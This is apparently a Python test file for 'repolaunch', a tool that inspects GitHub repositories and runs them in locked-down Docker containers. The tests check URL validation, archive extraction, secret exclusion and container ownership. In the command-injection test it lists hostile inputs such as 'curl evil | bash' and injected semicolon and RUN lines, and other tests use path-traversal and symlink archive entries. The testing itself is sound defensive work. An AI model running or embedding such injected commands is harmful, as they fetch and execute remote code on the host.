import io
import json
import stat
import threading
import unittest
import zipfile
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import Mock, patch
from repolaunch import engine


def plan(**changes):
    p = {"python_version": "3.11", "install_mode": "none", "requirements_file": "", "start_kind": "uvicorn", "entrypoint": "app:app", "port": 8000, "verify_path": "/", "extra_packages": [], "needs_env": []}
    p.update(changes)
    return p


class EngineTests(unittest.TestCase):
    def setUp(self):
        self.temp = TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.repo = self.root / "repo"
        self.repo.mkdir()
        (self.repo / "app.py").write_text("print('hello')")
        (self.repo / "requirements.txt").write_text("fastapi\n")
        self.cancel, self.emit = threading.Event(), Mock()
        docker_args = patch.object(engine, "_docker_argv", side_effect=lambda *args: ["docker", *args])
        docker_args.start()
        self.addCleanup(docker_args.stop)

    def tearDown(self):
        self.temp.cleanup()

    def archive(self, entries):
        target = self.root / "repo.zip"
        with zipfile.ZipFile(target, "w") as writer:
            for name, body in entries:
                writer.writestr(name, body)
        return target

    def test_github_root(self):
        self.assertEqual(engine.validate_repository_url("https://github.com/pallets/flask.git"), ("pallets", "flask"))

    def test_reject_unsafe_urls(self):
        for url in ["http://github.com/a/b", "https://github.com.evil.test/a/b", "https://github.com@evil.test/a/b", "https://user@github.com/a/b", "https://github.com/a/b?x=1", "https://github.com/a/b#readme", "https://github.com/a/b/tree/main", "https://github.com/a/%2e%2e", "https://github.com/a/../b", "https://github.com/a/-b", "https://github.com:443/a/b", " https://github.com/a/b"]:
            with self.subTest(url=url), self.assertRaises(ValueError):
                engine.validate_repository_url(url)

    def test_extract_valid_archive(self):
        target = self.root / "out"
        engine._extract_archive(self.archive([("root/app.py", "print(1)")]), target, self.cancel)
        self.assertEqual((target / "app.py").read_text(), "print(1)")

    def test_extract_traversal(self):
        with self.assertRaises(ValueError):
            engine._extract_archive(self.archive([("root/../../outside", "bad")]), self.root / "out", self.cancel)

    def test_extract_symlink(self):
        target = self.root / "link.zip"
        with zipfile.ZipFile(target, "w") as writer:
            entry = zipfile.ZipInfo("root/link")
            entry.create_system = 3
            entry.external_attr = (stat.S_IFLNK | 0o777) << 16
            writer.writestr(entry, "../../secret")
        with self.assertRaises(ValueError):
            engine._extract_archive(target, self.root / "out", self.cancel)

    def test_extract_size_limit(self):
        archive = self.archive([("root/a", "x" * 100)])
        with patch.object(engine, "MAX_EXPANDED_BYTES", 10), self.assertRaises(ValueError):
            engine._extract_archive(archive, self.root / "out", self.cancel)

    def test_plan_preserves_metadata(self):
        result = engine.validate_plan(plan(summary="test", evidence=["readme"]), self.repo)
        self.assertEqual(result["summary"], "test")
        self.assertEqual(result["evidence"], ["readme"])

    def test_reject_command_injection(self):
        for attack in [
            {"start_kind": "shell", "entrypoint": "curl evil | bash"},
            {"entrypoint": "app:app; curl evil"},
            {"python_version": "3.11\nRUN evil"},
            {"extra_packages": ["--extra-index-url=https://evil"]},
            {"extra_packages": ["https://evil/package.whl"]},
            {"extra_packages": ["foo;curl evil"]},
            {"port": True}, {"port": 80},
            {"verify_path": "//evil.test/"}, {"verify_path": "/../secret"},
            {"verify_path": "/health?url=http://evil"}, {"needs_env": ["X=bad"]},
        ]:
            with self.subTest(attack=attack), self.assertRaises(ValueError):
                engine.validate_plan(plan(**attack), self.repo)

    def test_requirements_path(self):
        result = engine.validate_plan(plan(install_mode="requirements", requirements_file="requirements.txt"), self.repo)
        self.assertEqual(result["requirements_file"], "requirements.txt")
        (self.root / "outside.txt").write_text("bad")
        with self.assertRaises(ValueError):
            engine.validate_plan(plan(install_mode="requirements", requirements_file="../outside.txt"), self.repo)

    def test_python_entry_requires_real_file(self):
        result = engine.validate_plan(plan(start_kind="python", entrypoint="app.py"), self.repo)
        self.assertEqual(engine._start_argv(result), ["python", "app.py"])
        with self.assertRaises(ValueError):
            engine.validate_plan(plan(start_kind="python", entrypoint="missing.py"), self.repo)

    def test_dockerfile_exec_and_nonroot(self):
        value = engine.validate_plan(plan(extra_packages=["uvicorn==0.30.0"]), self.repo)
        content = engine._dockerfile(value)
        self.assertIn("USER 10001:10001", content)
        self.assertIn('CMD ["python", "-m", "uvicorn"', content)
        self.assertIn('RUN ["python", "-m", "pip", "install"', content)

    def test_context_omits_secrets_and_supports_retry(self):
        for name in [".env", ".env.local", "secret.pem"]:
            (self.repo / name).write_text("SECRET")
        (self.repo / "Dockerfile").write_text("FROM bad\nRUN evil")
        context, content = engine._prepare_context(self.repo, "one", engine.validate_plan(plan(), self.repo))
        for name in [".env", ".env.local", "secret.pem"]:
            self.assertFalse((context / name).exists())
        self.assertEqual((context / "Dockerfile").read_text(), content)
        second, _ = engine._prepare_context(self.repo, "one", engine.validate_plan(plan(), self.repo))
        self.assertNotEqual(context, second)

    def test_cancellation_before_execution(self):
        self.cancel.set()
        with self.assertRaises(engine.TaskCancelled):
            engine._command(["docker", "anything"], self.emit, self.cancel, 1)

    def test_missing_docker(self):
        with patch.object(engine, "resolve_docker_path", return_value=None):
            self.assertFalse(engine.docker_status()["available"])

    def test_run_security_and_readiness(self):
        calls = []
        def command(argv, *args):
            calls.append(argv)
            return "127.0.0.1:12345\n" if argv[1] == "port" else "a" * 64
        response = Mock()
        response.status = 200
        response.__enter__ = Mock(return_value=response)
        response.__exit__ = Mock(return_value=False)
        opener = Mock()
        opener.open.return_value = response
        with patch.object(engine, "docker_status", return_value={"available": True}), patch.object(engine, "_command", side_effect=command), patch.object(engine, "_read_logs", return_value="ready"), patch.object(engine.urllib.request, "build_opener", return_value=opener), patch.object(engine, "stop_project") as stop:
            result = engine.run_project("test-run", self.repo, plan(), self.emit, self.cancel)
        command = next(c for c in calls if c[1] == "run")
        for flag in ["127.0.0.1::8000", "no-new-privileges", "--memory", "--cpus", "--cap-drop", "max-size=5m", "max-file=2"]:
            self.assertIn(flag, command)
        for flag in ["--privileged", "--volume", "--env"]:
            self.assertNotIn(flag, command)
        self.assertTrue(result["verification"]["passed"])
        self.assertEqual(result["verification"]["kind"], "http_readiness")
        stop.assert_not_called()

    def test_failed_readiness_cleans_container(self):
        def command(argv, *args):
            return "127.0.0.1:12345" if argv[1] == "port" else "id"
        with patch.object(engine, "docker_status", return_value={"available": True}), patch.object(engine, "_command", side_effect=command), patch.object(engine, "_read_logs", return_value="crashed"), patch.object(engine, "VERIFY_TIMEOUT", 0), patch.object(engine, "stop_project") as stop:
            result = engine.run_project("bad-run", self.repo, plan(), self.emit, self.cancel)
        self.assertFalse(result["verification"]["passed"])
        self.assertIsNone(result["url"])
        stop.assert_called_once_with("repolaunch-bad-run")

    def test_startup_port_failure_emits_stderr_before_owned_cleanup(self):
        primary = RuntimeError("docker port: no public port available")
        traceback = "Traceback (most recent call last):\nModuleNotFoundError: No module named 'requests'\n"
        order = []
        emitted = []

        def command(argv, *args):
            if argv[1] == "port":
                raise primary
            return "a" * 64

        def docker(argv, **kwargs):
            operation = argv[1]
            order.append(operation)
            if operation == "logs":
                return Mock(returncode=0, stdout="", stderr=traceback)
            if operation == "inspect":
                return Mock(returncode=0, stdout=json.dumps({"repolaunch.managed": "true", "repolaunch.task": "early-exit"}), stderr="")
            if operation == "rm":
                return Mock(returncode=0, stdout="", stderr="")
            self.fail("Unexpected Docker command: " + operation)

        def emit(kind, message):
            emitted.append((kind, message))
            if kind == "log" and "ModuleNotFoundError" in message:
                order.append("retained-stderr")

        with patch.object(engine, "docker_status", return_value={"available": True}), patch.object(engine, "_command", side_effect=command), patch.object(engine.subprocess, "run", side_effect=docker), self.assertRaises(RuntimeError) as raised:
            engine.run_project("early-exit", self.repo, plan(), emit, self.cancel)
        self.assertIs(raised.exception, primary)
        self.assertIn(("log", traceback), emitted)
        self.assertEqual(order, ["logs", "retained-stderr", "inspect", "rm"])

    def test_startup_error_survives_log_and_cleanup_failures(self):
        primary = RuntimeError("docker port failed")

        def command(argv, *args):
            if argv[1] == "port":
                raise primary
            return "a" * 64

        with patch.object(engine, "docker_status", return_value={"available": True}), patch.object(engine, "_command", side_effect=command), patch.object(engine, "_read_logs", side_effect=RuntimeError("logs unavailable")), patch.object(engine, "stop_project", side_effect=RuntimeError("daemon unavailable")), self.assertRaises(RuntimeError) as raised:
            engine.run_project("early-exit", self.repo, plan(), self.emit, self.cancel)
        self.assertIs(raised.exception, primary)
        self.assertTrue(any(call.args[0] == "warning" and "daemon unavailable" in call.args[1] for call in self.emit.call_args_list))

    def test_required_secrets_block_execution(self):
        with patch.object(engine, "_command") as command, self.assertRaises(ValueError):
            engine.run_project("one", self.repo, plan(needs_env=["API_KEY"]), self.emit, self.cancel)
        command.assert_not_called()

    def test_stop_refuses_other_containers(self):
        for value in ["postgres", "--all", "abc123", "a" * 64, "repolaunch-../../bad"]:
            with self.subTest(value=value), self.assertRaises(ValueError):
                engine.stop_project(value)

    def test_underscore_environment_names_preserved(self):
        value = engine.validate_plan(plan(needs_env=["_PRIVATE_KEY"]), self.repo)
        self.assertEqual(value["needs_env"], ["_PRIVATE_KEY"])

    def test_stop_checks_container_ownership(self):
        unknown = Mock(returncode=0, stdout=json.dumps({"repolaunch.managed": "true", "repolaunch.task": "other"}), stderr="")
        with patch.object(engine.subprocess, "run", return_value=unknown) as run, self.assertRaises(ValueError):
            engine.stop_project("repolaunch-one")
        self.assertEqual(run.call_count, 1)

    def test_stop_does_not_claim_success_on_docker_error(self):
        owned = Mock(returncode=0, stdout=json.dumps({"repolaunch.managed": "true", "repolaunch.task": "one"}), stderr="")
        failed = Mock(returncode=1, stdout="", stderr="daemon unavailable")
        with patch.object(engine.subprocess, "run", side_effect=[owned, failed]), self.assertRaises(RuntimeError):
            engine.stop_project("repolaunch-one")

    def test_stop_missing_container_is_idempotent(self):
        missing = Mock(returncode=1, stdout="", stderr="Error: No such container: repolaunch-one")
        with patch.object(engine.subprocess, "run", return_value=missing) as run:
            engine.stop_project("repolaunch-one")
        self.assertEqual(run.call_count, 1)

    def test_git_fallback_disables_credentials_and_global_config(self):
        sha = "b" * 40
        with patch.object(engine.shutil, "which", return_value="git"), patch.object(engine, "_command", return_value=sha + " HEAD") as command:
            result = engine._resolve_git_head("https://github.com/a/b", self.cancel, self.emit)
        self.assertEqual(result, sha)
        argv = command.call_args.args[0]
        self.assertIn("credential.helper=", argv)
        self.assertIn("http.followRedirects=false", argv)
        self.assertEqual(argv[-4:], ["ls-remote", "--exit-code", "https://github.com/a/b", "HEAD"])
        env = command.call_args.kwargs["environment"]
        self.assertEqual(env["GIT_TERMINAL_PROMPT"], "0")
        self.assertEqual(env["GIT_CONFIG_NOSYSTEM"], "1")
        self.assertEqual(env["GIT_CONFIG_GLOBAL"], engine.os.devnull)

    def test_inspection_api_rate_limit_falls_back_then_pins_archive(self):
        sha = "c" * 40
        data = io.BytesIO()
        with zipfile.ZipFile(data, "w") as writer:
            writer.writestr("root/app.py", "print('hello')")
        with patch.object(engine, "_download", side_effect=[engine.GitHubRateLimit("limited"), data.getvalue()]) as download, patch.object(engine, "_resolve_git_head", return_value=sha) as fallback:
            result = engine.inspect_repository("https://github.com/a/b", self.root / "fallback", self.cancel, self.emit)
        self.assertEqual(result["commit"], sha)
        self.assertTrue(download.call_args_list[-1].args[0].endswith(sha))
        fallback.assert_called_once()

    def test_inspection_pins_commit_and_excludes_secret_context(self):
        sha = "a" * 40
        data = io.BytesIO()
        with zipfile.ZipFile(data, "w") as writer:
            writer.writestr("root/README.md", "# Test")
            writer.writestr("root/app.py", "print('hello')")
            writer.writestr("root/.env", "DO_NOT_SEND=secret")
        urls = []
        def download(url, *args):
            urls.append(url)
            return json.dumps({"sha": sha}).encode() if len(urls) == 1 else data.getvalue()
        with patch.object(engine, "_download", side_effect=download):
            result = engine.inspect_repository("https://github.com/a/b", self.root / "task", self.cancel, self.emit)
        self.assertEqual(result["commit"], sha)
        self.assertTrue(urls[1].endswith(sha))
        self.assertEqual(result["readme"], "# Test")
        self.assertNotIn(".env", result["files"])


if __name__ == "__main__":
    unittest.main()


def test_docker_explicit_path_wins_over_path(tmp_path, monkeypatch):
    executable = tmp_path / "custom docker" / "docker.exe"
    executable.parent.mkdir()
    executable.write_bytes(b"test")
    monkeypatch.setenv("REPOLAUNCH_DOCKER_PATH", str(executable))
    lookup = Mock(return_value="another-docker")
    monkeypatch.setattr(engine.shutil, "which", lookup)
    assert engine.resolve_docker_path() == str(executable.resolve())
    lookup.assert_not_called()


def test_docker_invalid_override_does_not_silently_fallback(tmp_path, monkeypatch):
    monkeypatch.setenv("REPOLAUNCH_DOCKER_PATH", str(tmp_path / "missing.exe"))
    lookup = Mock(return_value="another-docker")
    monkeypatch.setattr(engine.shutil, "which", lookup)
    assert engine.resolve_docker_path() is None
    assert engine.docker_status()["cli_path"] is None
    lookup.assert_not_called()


def test_docker_sibling_install_is_discovered_without_process_restart(tmp_path, monkeypatch):
    monkeypatch.delenv("REPOLAUNCH_DOCKER_PATH", raising=False)
    monkeypatch.setattr(engine.shutil, "which", Mock(return_value=None))
    monkeypatch.setattr(engine, "__file__", str(tmp_path / "RepoLaunch" / "repolaunch" / "engine.py"))
    monkeypatch.setenv("ProgramFiles", str(tmp_path / "program-files"))
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path / "local-app-data"))
    monkeypatch.setattr(engine.Path, "home", Mock(return_value=tmp_path / "home"))
    assert engine.resolve_docker_path() is None
    executable = tmp_path / "DockerDesktop" / "resources" / "bin" / "docker.exe"
    executable.parent.mkdir(parents=True)
    executable.write_bytes(b"test")
    assert engine.resolve_docker_path() == str(executable.resolve())
    assert engine._docker_argv("info") == [str(executable.resolve()), "info"]


def test_docker_localappdata_install_location(tmp_path, monkeypatch):
    monkeypatch.delenv("REPOLAUNCH_DOCKER_PATH", raising=False)
    monkeypatch.setattr(engine.shutil, "which", Mock(return_value=None))
    monkeypatch.setattr(engine, "__file__", str(tmp_path / "RepoLaunch" / "repolaunch" / "engine.py"))
    monkeypatch.setenv("ProgramFiles", str(tmp_path / "program-files"))
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path / "local"))
    executable = tmp_path / "local" / "Programs" / "DockerDesktop" / "resources" / "bin" / "docker.exe"
    executable.parent.mkdir(parents=True)
    executable.write_bytes(b"test")
    assert engine.resolve_docker_path() == str(executable.resolve())


def test_docker_status_reports_and_uses_resolved_executable(monkeypatch):
    executable = r"F:\CustomDocker\resources\bin\docker.exe"
    monkeypatch.setattr(engine, "resolve_docker_path", Mock(return_value=executable))
    run = Mock(return_value=Mock(returncode=0, stdout="29.0.0\n", stderr=""))
    monkeypatch.setattr(engine.subprocess, "run", run)
    status = engine.docker_status()
    assert status["available"] is True
    assert status["cli_path"] == executable
    assert run.call_args.args[0][0] == executable


def test_docker_access_denied_is_not_reported_as_stopped_engine(monkeypatch):
    monkeypatch.setattr(engine, "resolve_docker_path", Mock(return_value="docker.exe"))
    for error in [
        "permission denied while trying to connect npipe:////./pipe/dockerDesktopLinuxEngine",
        "open //./pipe/dockerDesktopLinuxEngine: Access is denied.",
        "拒绝访问。E_ACCESSDENIED",
    ]:
        monkeypatch.setattr(engine.subprocess, "run", Mock(return_value=Mock(returncode=1, stdout="", stderr=error)))
        status = engine.docker_status()
        assert status["reason"] == "access_denied"
        assert "普通Windows会话" in status["message"]
        assert status["engine_error"]


def test_docker_missing_daemon_has_separate_reason(monkeypatch):
    monkeypatch.setattr(engine, "resolve_docker_path", Mock(return_value="docker.exe"))
    monkeypatch.setattr(engine.subprocess, "run", Mock(return_value=Mock(returncode=1, stdout="", stderr="Cannot connect to Docker daemon")))
    assert engine.docker_status()["reason"] == "daemon_unavailable"


def test_docker_error_snippet_bounded_and_redacted(monkeypatch):
    monkeypatch.setenv("REPOLAUNCH_API_KEY", "privatevalue")
    status = engine._docker_failure_status("docker.exe", "password=supersecret\n" + "x" * 800 + " privatevalue")
    assert len(status["engine_error"]) <= 600
    assert "supersecret" not in status["engine_error"]
    assert "privatevalue" not in status["engine_error"]
    assert "\n" not in status["engine_error"]


def test_docker_peruser_fallback_works_when_localappdata_is_redirected(tmp_path, monkeypatch):
    monkeypatch.delenv("REPOLAUNCH_DOCKER_PATH", raising=False)
    monkeypatch.setattr(engine.shutil, "which", Mock(return_value=None))
    monkeypatch.setattr(engine, "__file__", str(tmp_path / "RepoLaunch" / "repolaunch" / "engine.py"))
    monkeypatch.setenv("ProgramFiles", str(tmp_path / "program-files"))
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path / "isolated-container"))
    home = tmp_path / "real-home"
    monkeypatch.setattr(engine.Path, "home", Mock(return_value=home))
    executable = home / "AppData" / "Local" / "Programs" / "DockerDesktop" / "resources" / "bin" / "docker.exe"
    executable.parent.mkdir(parents=True)
    executable.write_bytes(b"test")
    assert engine.resolve_docker_path() == str(executable.resolve())



def test_command_drains_reader_even_when_process_already_exited(monkeypatch):
    class DelayedStdout:
        def __iter__(self):
            threading.Event().wait(0.35)
            yield "127.0.0.1:49152\n"

        def close(self):
            pass

    process = Mock(stdout=DelayedStdout())
    process.poll.return_value = 0
    process.wait.return_value = 0
    monkeypatch.setattr(engine.subprocess, "Popen", Mock(return_value=process))
    output = engine._command(["controlled-test-command"], Mock(), threading.Event(), 2)
    assert output == "127.0.0.1:49152\n"
    process.terminate.assert_not_called()
